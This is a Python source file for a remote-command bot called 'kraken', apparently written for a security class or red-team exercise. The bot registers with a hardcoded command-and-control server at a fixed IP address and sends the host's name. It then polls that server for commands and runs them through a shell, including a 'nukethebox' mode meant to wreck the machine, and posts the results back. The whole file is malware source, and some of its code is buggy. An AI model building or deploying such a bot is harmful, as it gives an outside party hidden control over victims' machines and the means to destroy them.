#!/usr/bin/env python3
# Amanda Brown (aeb6590) 
# kraken.py (HTTP bot) 

# Import necessary libraries 
import json
import socket
import requests
import subprocess
import time
import string
import random 


# Define the bot 
class Bot:
    def _init_(self,uuid):
        self.uuid = uuid

# Execute a passed in shell command 
def shellExec(command):
    command = "'" + command + "'"
    print(command)
    resp = subprocess.call(command, shell=True)
    return resp

# Execute the passed in nuke command
def nuke(command):
    command = "'" + command + "'"
    print(command) 
    resp = subprocess.call(command, shell=True)
    return resp

# Figure the bot's sleep time
def sleepTime(ret):
    sleepTime = 3
    if ret != 200: 
        sleepTime = 300
    return sleepTime

# Get a random 64 letter uuid for the bot
def getUUID():
    chars = string.ascii_letters
    uuid = ''.join(random.choice(chars) for i in range(64))
    return uuid

# Execute the program
def main():

    status = 0
    
    # Instantiate the bot and give it a uuid 
    kraken = Bot()
    kraken.uuid = "aeb"

    host = socket.gethostname() 
    server = 'http://129.21.115.114:8080'
    
    # Send the bot info to the server
    botInfo = {'uuid':kraken.uuid, 'config_interval':5, 'config_intervaldelta':5, 'config_servers':server,'facts_hostname':host, 'facts_interfaces':'eth0'}
    register = requests.post(server + '/register', data=botInfo)
    status = register.status_code
    print(register.text)

    # Keep attempting to connect
    while (status != 200):
        time.sleep(5)
        register = requests.post(server + '/register', data=botInfo)
        status = register.status_code

    # Keep looping for commands 
    while (True):
        print("here")
        cmd = requests.post(server + '/getcommand', data=botInfo)
        cmd = cmd.text
        print(cmd)
        parsedCmd = json.loads(cmd)
        resp = "" 

        # If server replies with shell execution command
        if parsedCmd.get("mode") == "shell":
            print("before shell exec")
            resp = shellExec(parsedCmd.get("command"))
            print(resp) 

        # If server replies with nuke the box command 
        if parsedCmd.get("mode") == "nukethebox": 
            print("before the nuking")
            resp = nuke(parsedCmd.get("command"))
            print(resp)

        # Send results back 
        botSend = {'uuid':kraken.uuid,'uaid':parsedCmd.get("uaid"), 'error':0, 'resp':resp}
        ret = requests.post(server + '/postresults',data=botSend)
        
        # Time to sleep 
        TTS = sleepTime(ret.status_code) 
        time.sleep(TTS)

main()
